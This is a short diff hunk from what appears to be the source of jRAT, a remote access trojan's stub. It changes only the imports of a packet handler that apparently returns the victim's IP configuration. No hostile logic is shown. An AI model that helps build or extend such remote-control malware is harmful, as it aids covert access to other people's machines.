@@ -2,11 +2,9 @@ package io.jrat.stub.packets.incoming;
 
 import io.jrat.stub.Connection;
 import io.jrat.stub.packets.outgoing.Packet50IPConfig;
-
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-
-import com.redpois0n.oslib.OperatingSystem;
+import oslib.OperatingSystem;
 
 
 public class Packet72IPConfig extends AbstractIncomingPacket {
